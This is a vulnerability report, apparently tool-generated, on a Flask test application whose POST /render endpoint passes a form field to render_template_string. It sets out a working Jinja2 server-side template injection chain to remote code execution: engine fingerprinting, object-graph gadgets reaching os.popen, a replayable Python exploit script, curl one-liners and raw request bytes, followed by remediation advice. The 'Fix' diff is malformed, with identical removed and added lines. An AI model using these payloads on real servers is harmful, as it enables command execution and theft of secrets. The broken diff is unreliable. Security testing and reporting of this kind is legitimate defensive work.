╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Server-Side Template Injection (Jinja2) to Remote Code Execution in  │
│  POST /render `tpl` form field                                               │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.8                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask application, app.py)               │
│                                                                              │
│  Endpoint: /render                                                           │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  The `POST /render` endpoint passes the user-supplied form field `tpl`       │
│  directly to `flask.render_template_string()`, which compiles and evaluates  │
│  it with the default, unsandboxed Jinja2 environment. Any unauthenticated    │
│  client that can send a form-encoded POST can therefore evaluate arbitrary   │
│  template expressions, walk Python object internals, and execute             │
│  operating-system commands as the account running the application.           │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated remote attacker obtains command execution on the         │
│  application host as the OS user running the service. Demonstrated: `id`     │
│  returning `uid=1000(pentester) gid=1000(pentester)                          │
│  groups=1000(pentester),27(sudo)`, `uname -a`, reading `/etc/hostname`,      │
│  listing Python subclasses, and dumping process environment variables        │
│  (including proxy configuration and application runtime paths). From this    │
│  position an attacker can read the application's SQLite database and         │
│  configuration, exfiltrate any secret material available to the service      │
│  account, pivot to other services reachable from the host, and establish     │
│  persistence through files writable by that account.                         │
│                                                                              │
│  Technical Analysis                                                          │
│  The vulnerable handler is the `/render` route in `app.py`:                  │
│                                                                              │
│  ```python title=app.py startLineNumber=39 endLineNumber=43                  │
│  @app.route("/render", methods=["POST"])                                     │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│  ```                                                                         │
│                                                                              │
│  `request.form.get("tpl", "hello")` returns attacker-controlled text with    │
│  no validation, type restriction, allowlist, or sanitization. That raw text  │
│  is handed to `flask.render_template_string()`, which internally constructs  │
│  a `jinja2.Template` from the string and calls `.render()` on it. Because    │
│  the application never configures a sandbox, the template is compiled by     │
│  the default `jinja2.Environment` (`SandboxedEnvironment` is not in use,     │
│  and no custom filters/globals restriction is applied). A template authored  │
│  by the attacker therefore has the full Jinja2 language available,           │
│  including attribute access on arbitrary objects, `__globals__` traversal    │
│  into module namespaces, and calls into `os`/`subprocess` reachable from     │
│  those namespaces.                                                           │
│                                                                              │
│  The route's own docstring at `app.py` lines 1-7 claims the injection is     │
│  "Mako SSTI in a POST form field (not Jinja2, not a query string)". Dynamic  │
│  probing disproves the engine claim and confirms the transport claim:        │
│                                                                              │
│  - `{{7*7}}` renders `49` and `{{7*8}}` renders `56` — Jinja2/Twig/Nunjucks  │
│  family.                                                                     │
│  - `{{7*"7"}}` renders `7777777` — Jinja2's Python-style string repetition   │
│  (Twig would return `49`), so the engine is definitively Jinja2.             │
│  - `${7*7}`, `${7*"7"}`, `<%= 7*7 %>` and `#{7*7}` are all returned          │
│  verbatim, ruling out Mako, EJS/ERB and Pug. The application uses Jinja2     │
│  3.1.6 with Flask 3.1.3, and `render_template_string` was imported from      │
│  `flask` at `app.py` line 9.                                                 │
│                                                                              │
│  Transport is confirmed as a form-encoded body only: `GET /render` and `PUT  │
│  /render` return `405 METHOD NOT ALLOWED` with `Allow: POST, OPTIONS`; a     │
│  POST with the value in the query string (`?tpl={{7*7}}` with an empty       │
│  body), in a JSON body (`{"tpl":"{{7*7}}"}`), and a POST with no `tpl`       │
│  field all return the default `hello`. Only `Content-Type:                   │
│  application/x-www-form-urlencoded` with `tpl=...` in the body reaches the   │
│  sink.                                                                       │
│                                                                              │
│  The escape surface is fully open. `{{config}}` dumps the Flask `Config`     │
│  object, `{{self.__init__}}` returns a bound `TemplateReference` method,     │
│  `{{lipsum.__globals__}}` dumps the `jinja2.utils` module globals including  │
│  `__builtins__`, and `{{().__class__.__mro__[1].__subclasses__()}}`          │
│  enumerates loaded Python classes. From those globals three independent      │
│  paths reach a shell: `cycler.__init__.__globals__.os.popen(...)`,           │
│  `lipsum.__globals__['os'].popen(...)`, and                                  │
│  `self.__init__.__globals__['__builtins__']['__import__']('os').popen(...)`  │
│  , all of which returned real command output.                                │
│                                                                              │
│  The only output transformation present is Jinja2's HTML autoescaping of     │
│  the final rendered string (e.g. `<` becomes `&lt;` in command output).      │
│  Autoescaping is applied *after* evaluation, so it constrains how a          │
│  response looks in a browser but has no effect on the object graph           │
│  reachable during evaluation and therefore no effect on code execution.      │
│  Literal markup present in the template itself is not escaped at all —       │
│  `tpl=<script>alert(1)</script>` is returned verbatim, so the route is also  │
│  an HTML-injection surface.                                                  │
│                                                                              │
│  PoC Description                                                             │
│  1. Identify the transport: the endpoint accepts only POST with an           │
│  `application/x-www-form-urlencoded` body; GET and PUT return 405.           │
│  2. Send a benign form field `tpl=hello` and confirm it is echoed back as    │
│  `hello`, establishing baseline behavior.                                    │
│  3. Send `tpl={{7*7}}` and observe the response body `49`, then              │
│  `tpl={{7*8}}` and observe `56`. This proves the input is evaluated as       │
│  server-side template syntax rather than merely reflected.                   │
│  4. Fingerprint the engine by sending `${7*7}`, `<%= 7*7 %>` and `#{7*7}`    │
│  (all returned verbatim) and `{{7*"7"}}` (returns `7777777`), confirming     │
│  the engine is Jinja2, not Mako or Twig/EJS.                                 │
│  5. Confirm internal object access with `tpl={{config}}` and                 │
│  `tpl={{lipsum.__globals__}}`, which return the Flask configuration and the  │
│  `jinja2.utils` module globals.                                              │
│  6. Achieve command execution with                                           │
│  `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}`; the response   │
│  body is the real output of `id`.                                            │
│  7. Repeat with `uname -a`, `cat /etc/hostname` and `env` through the same   │
│  `.os.popen(...).read()` primitive to demonstrate arbitrary command          │
│  execution and data exfiltration.                                            │
│  8. Replay the request against the patched application (rendering a static   │
│  template with the value passed as a context variable) and confirm the       │
│  payloads are returned as literal text and no command runs.                  │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  """Replayable PoC: Jinja2 SSTI -> RCE on POST /render (form field           │
│  `tpl`)."""                                                                  │
│  import re                                                                   │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://127.0.0.1:8099"                                              │
│  S = requests.Session()                                                      │
│  S.trust_env = False  # bypass any proxy for localhost                       │
│                                                                              │
│                                                                              │
│  def send(tpl):                                                              │
│      r = S.post(BASE + "/render", data={"tpl": tpl}, timeout=10)             │
│      return r.status_code, r.text                                            │
│                                                                              │
│                                                                              │
│  print("== transport checks ==")                                             │
│  print("GET  /render            ->", S.get(BASE + "/render").status_code)    │
│  # 405                                                                       │
│  print("PUT  /render            ->", S.put(BASE + "/render", data={"tpl":    │
│  "{{7*7}}"}).status_code)  # 405                                             │
│  print("POST query-string only  ->", S.post(BASE + "/render",                │
│  params={"tpl": "{{7*7}}"}, data={}).text)  # hello                          │
│  print("POST json body          ->", S.post(BASE + "/render", json={"tpl":   │
│  "{{7*7}}"}).text)  # hello                                                  │
│                                                                              │
│  print("\n== engine fingerprint ==")                                         │
│  for payload in ["hello", "{{7*7}}", "{{7*8}}", "{{7*'7'}}", "${7*7}", "<%=  │
│  7*7 %>", "#{7*7}"]:                                                         │
│      print(f"{payload!r:20} -> {send(payload)[1]!r}")                        │
│                                                                              │
│  print("\n== internal object access ==")                                     │
│  print("{{config}}                     ->", send("{{config}}")[1][:80])      │
│  print("{{lipsum.__globals__}}         ->",                                  │
│  send("{{lipsum.__globals__}}")[1][:80])                                     │
│                                                                              │
│  print("\n== command execution ==")                                          │
│  for cmd in ["id", "uname -a", "cat /etc/hostname"]:                         │
│      payload = "{{cycler.__init__.__globals__.os.popen('%s').read()}}" %     │
│  cmd                                                                         │
│      status, body = send(payload)                                            │
│      print(f"$ {cmd}\n{body.strip()}\n")                                     │
│                                                                              │
│  # Alternate gadgets, same primitive                                         │
│  alt = "{{lipsum.__globals__['os'].popen('id').read()}}"                     │
│  print("$ id (lipsum gadget)\n" + send(alt)[1].strip())                      │
│  alt2 =                                                                      │
│  "{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id  │
│  ').read()}}"                                                                │
│  print("$ id (builtins gadget)\n" + send(alt2)[1].strip())                   │
│                                                                              │
│  # Raw wire format that triggers RCE (form-encoded)                          │
│  print("\nraw request bytes:")                                               │
│  print("POST /render HTTP/1.1\r\nHost: 127.0.0.1:8099\r\n"                   │
│        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length:   │
│  77\r\n\r\n"                                                                 │
│        "tpl=%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%2  │
│  8%29%7D%7D")                                                                │
│  ```                                                                         │
│                                                                              │
│  ```bash                                                                     │
│  # Minimal curl reproductions                                                │
│  curl -s -X POST --data-urlencode 'tpl={{7*7}}'                              │
│  http://127.0.0.1:8099/render                                                │
│  curl -s -X POST --data-urlencode                                            │
│  "tpl={{cycler.__init__.__globals__.os.popen('id').read()}}"                 │
│  http://127.0.0.1:8099/render                                                │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:42-43                                                  │
│    Sink: unvalidated form value passed as template source to                 │
│  render_template_string                                                      │
│        tpl = request.form.get("tpl", "hello")                                │
│      return render_template_string(tpl)                                      │
│    Fix:                                                                      │
│    -     value = request.form.get("tpl", "hello")                            │
│      return render_template_string("{{ value }}", value=value)               │
│    +     value = request.form.get("tpl", "hello")                            │
│      return render_template_string("{{ value }}", value=value)               │
│                                                                              │
│  Remediation                                                                 │
│  Never pass user input to `render_template_string`, `Template(...)`,         │
│  `Environment.from_string`, or any other API that treats the input as        │
│  template source. Render a fixed template stored in the application and      │
│  pass the user's value as a context variable so the template engine escapes  │
│  it as data; the value is then never parsed as template syntax. If users     │
│  genuinely must author template fragments, compile them with                 │
│  `jinja2.sandbox.SandboxedEnvironment` configured with an explicit           │
│  allowlist of globals, filters, and attributes, and enforce a strict deny    │
│  of dunder attributes, `__globals__`, `__builtins__`, `__class__`,           │
│  `__subclasses__` and any callable that reaches the filesystem or process    │
│  APIs — and still treat this as defense in depth rather than a guarantee.    │
│  Additionally, strip or reject the template delimiters `{{`, `{%`, `{#` on   │
│  this field as an input-level backstop, apply a maximum input length, and    │
│  ensure the service account runs with the least privilege required so a      │
│  future engine-level failure cannot escalate to host-level command           │
│  execution. Where the field is only meant to carry display text, prefer      │
│  `Markup.escape`-style output encoding and a Jinja environment with          │
│  `autoescape=True` for any HTML surface.                                     │
│                                                                              │
